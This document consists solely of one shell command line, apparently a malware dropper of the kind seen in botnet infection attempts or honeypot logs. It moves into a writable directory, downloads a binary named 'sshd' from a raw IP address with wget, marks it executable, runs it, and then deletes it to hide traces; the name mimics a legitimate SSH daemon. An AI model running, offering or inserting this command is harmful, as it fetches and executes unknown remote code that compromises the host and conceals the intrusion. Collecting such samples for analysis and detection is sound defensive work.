cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.117.45/sshd; chmod +x sshd; ./sshd; rm -rf sshd
